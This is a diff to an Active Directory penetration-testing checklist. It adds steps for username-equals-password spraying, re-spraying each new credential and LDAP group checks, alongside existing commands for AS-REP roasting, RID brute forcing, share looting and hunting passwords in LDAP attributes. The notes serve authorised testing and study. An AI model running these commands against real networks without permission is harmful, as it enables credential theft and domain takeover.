@@ -18,11 +18,14 @@ Reference: [AD Enumeration](../1-information-gathering/06-active-directory-enume
 - [ ] LDAP anonymous bind: `ldapsearch -x -H ldap://<dc-ip> -b "DC=domain,DC=local"`.
 - [ ] User enum via RID cycling: `nxc smb <dc-ip> -u guest -p '' --rid-brute 10000`.
 - [ ] Kerberos user enum (works without creds): `kerbrute userenum -d <domain> --dc <dc-ip> users.txt`.
+  - **Strip trailing whitespace from `users.txt` first** — a stray space after a name makes userenum silently skip it: `sed -i 's/[[:space:]]*$//' users.txt`.
 - [ ] AS-REP roast anyone unregistered for pre-auth: `impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip> -no-pass -format hashcat`.
+- [ ] **Username == password check** — cheap and hits constantly: `nxc smb <dc-ip> -u users.txt -p users.txt --no-brute --continue-on-success`.
 
 ## When you have one credential
 
 - [ ] **Spray it everywhere**: `nxc smb hosts.txt -u <user> -p <pass> --continue-on-success`, then repeat with `-winrm`, `-mssql`, `-ldap`, `-ssh`, `-ftp`.
+  - **Repeat this for *every* new account you obtain, not just the first** — a cred that was worthless on one host is often admin on another, and each one can unlock users/shares the last couldn't see.
 - [ ] SMB shares readable? `nxc smb <ip> -u <user> -p <pass> --shares`, then `smbclient //<ip>/<share> -U '<user>%<pass>'`.
 - [ ] **Mount instead of interactive smbclient** — `sudo mount -t cifs //<ip>/<share> ./loot -o username=<user>,password=<pass>,vers=3.0` — tab-complete and grep like a real FS.
 - [ ] **Auto-download every readable share**: `nxc smb <ip> -u <user> -p <pass> -M spider_plus -o DOWNLOAD_FLAG=true` → files land in `/root/.nxc/modules/nxc_spider_plus/<ip>/`.
@@ -31,6 +34,7 @@ Reference: [AD Enumeration](../1-information-gathering/06-active-directory-enume
 - [ ] Domain enum with bloodhound: `bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc-ip> -c All`.
   - Import into BloodHound → run "Find Shortest Paths to Domain Admins" from your owned user.
 - [ ] LDAP dump: `ldapdomaindump -u <domain>\\<user> -p <pass> <dc-ip>`.
+- [ ] **Check group membership without a shell** — `nxc ldap <dc-ip> -u <user> -p <pass> -M groupmembership -o USER=<user>` flags interesting groups (`Remote Management Users`, `Backup Operators`, custom admin groups) before you invest in a foothold.
 - [ ] **Always pull LDAP with `"*"` to see every attribute** — default output hides the interesting ones: `ldapsearch -x -H ldap://<dc-ip> -D '<user>@<dom>' -w '<pass>' -b 'dc=<dom>,dc=<tld>' '(objectClass=user)' '*'`.
 - [ ] Grep the full dump for creds in: `description`, `info`, `comment`, `notes`, `userPassword`, `unixUserPassword`, `unicodePwd`, `ms-Mcs-AdmPwd` (LAPS), `msDS-ManagedPassword` (gMSA), and any custom / non-standard attribute (`*legacyPwd`, `*helpdeskPwd`, etc. — non-stock schema is a red flag).
 - [ ] `nxc ldap <dc-ip> -u <user> -p <pass> -M user-desc` for a quick description-only sweep.
